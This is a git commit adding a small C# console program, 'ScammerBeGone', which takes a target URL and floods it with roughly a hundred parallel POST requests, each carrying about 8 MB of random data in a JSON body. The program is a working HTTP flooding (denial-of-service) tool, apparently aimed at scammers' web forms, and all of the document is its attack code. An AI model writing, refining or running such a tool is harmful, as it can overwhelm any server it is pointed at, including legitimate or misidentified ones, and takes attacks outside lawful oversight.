8984adb4af4df96472b1cf352b81de64cbb1bd98
Brandon <43607839+brann0n@users.noreply.github.com>
2021-02-20 22:48:17 +0100

    Add project files.

---
+++ ScammerBeGoneConsole/Program.cs
@@ -0,0 +1,65 @@
+﻿using Konsole;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace ScammerBeGoneConsole
+{
+    public class Program
+    {
+        HighSpeedWriter Writer;
+        Window MainWindow;
+        IConsole MainConsole;
+        IConsole RequestConsole;
+        IConsole ResponseConsole;
+
+        private RequestGenerator g;
+        private int RequestSizeInMb = 8;
+
+        static void Main(string[] args) => new Program().Init(args).GetAwaiter().GetResult();
+
+        private Program()
+        {
+            this.Writer = new HighSpeedWriter();
+            this.MainWindow = new Window(Writer);
+            MainWindow.CursorVisible = false;
+            MainConsole = Window.OpenBox("Scammers Be Gone", 0, 0, 110, 5, new BoxStyle() { ThickNess = LineThickNess.Single, Body = new Colors(ConsoleColor.Green, ConsoleColor.DarkGray) });
+            RequestConsole = Window.OpenBox("Requests", 0, 5, 55, 25, new BoxStyle() { ThickNess = LineThickNess.Double, Body = new Colors(ConsoleColor.White, ConsoleColor.Blue) });
+            ResponseConsole = Window.OpenBox("Responses", 55, 5, 55, 25, new BoxStyle() { ThickNess = LineThickNess.Double, Body = new Colors(ConsoleColor.White, ConsoleColor.Blue) });
+
+            g = new RequestGenerator(RequestSizeInMb); //do requests with 10mb in size
+            g.OnRequestCompleted += G_OnRequestCompleted;
+            g.OnRequestCreated += G_OnRequestCreated;
+        }
+
+        private void G_OnRequestCreated(string requestInfo)
+        {
+            RequestConsole.WriteLine(requestInfo);
+        }
+
+        private void G_OnRequestCompleted(string requestInfo)
+        {
+            ResponseConsole.WriteLine(requestInfo);
+        }
+
+        private async Task Init(string[] args)
+        {
+            if(args.Length == 0)
+            {
+                MainConsole.WriteLine("Please restart the program with your posturl as the first parameter. This program uploads data in json form, in future updates this can be changed with parameter", RequestSizeInMb);
+            }
+            else
+            {
+                MainConsole.WriteLine("Generating random data with size {0}", RequestSizeInMb);
+                MemoryStream data = await g.GenerateData();
+                MainConsole.WriteLine("Starting request service...");
+                StreamReader reader = new StreamReader(data);
+                reader.BaseStream.Position = 0;
+                await g.Start(await reader.ReadToEndAsync(), args[0]);
+            }
+        }
+    }
+}
---
+++ ScammerBeGoneConsole/RequestGenerator.cs
@@ -0,0 +1,82 @@
+﻿using RestSharp;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace ScammerBeGoneConsole
+{
+    public class RequestGenerator
+    {
+
+
+        public delegate void RequestStatusHandler(string requestInfo);
+
+        public event RequestStatusHandler OnRequestCompleted;
+        public event RequestStatusHandler OnRequestCreated;
+        private int SizeInBytes;
+        private int SizeInMB;
+        private long total;
+        private RestClient Client;
+
+
+        /// <summary>
+        /// Request generation class, give size in mb
+        /// </summary>
+        /// <param name="size">request size in mb</param>
+        public RequestGenerator(int size)
+        {
+            this.SizeInBytes = size * 1024 * 1024;
+            this.SizeInMB = size;
+            this.total = 0;
+        }
+
+        public async Task Start(string data, string urlToPost)
+        {
+            Client = new RestClient(urlToPost);
+            Client.Timeout = -1;
+            Parallel.For(1, 5*20, new ParallelOptions {MaxDegreeOfParallelism = 20 }, delegate (int i) { PerformRequest(data, i); });
+        }
+
+        private void PerformRequest(string data, int index)
+        {
+            OnRequestCreated?.Invoke($"starting request {index} with datalength: {data.Length}");
+
+            RestRequest request = new RestRequest(Method.POST);
+            request.AddHeader("Content-Type", "application/json");
+            request.AddParameter("application/json", $"{{\"data\":\"{data}\"}}", ParameterType.RequestBody);
+            IRestResponse response = Client.Execute(request);
+
+            if(response == null) OnRequestCompleted?.Invoke("Request " + index + " completed with no result");
+            else if(response.StatusCode == System.Net.HttpStatusCode.OK) OnRequestCompleted?.Invoke("Request " + index + " completed OK");
+            else if (response.StatusCode == System.Net.HttpStatusCode.InternalServerError) OnRequestCompleted?.Invoke("Request " + index + " completed with internal server error");
+            else OnRequestCompleted?.Invoke("Request " + index + " completed with other result: " + response.StatusCode);
+        }
+
+
+        public async Task<MemoryStream> GenerateData()
+        {
+            const int blockSize = 1024 * 8;
+            const int blocksPerMb = (1024 * 1024) / blockSize;
+
+            byte[] data = new byte[blockSize];
+
+            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
+            {
+                MemoryStream stream = new MemoryStream();
+
+                for (int i = 0; i < SizeInMB * blocksPerMb; i++)
+                {
+                    crypto.GetBytes(data);
+                    await stream.WriteAsync(data, 0, data.Length);
+                }
+
+                return stream;
+            }
+        }
+    }
+}
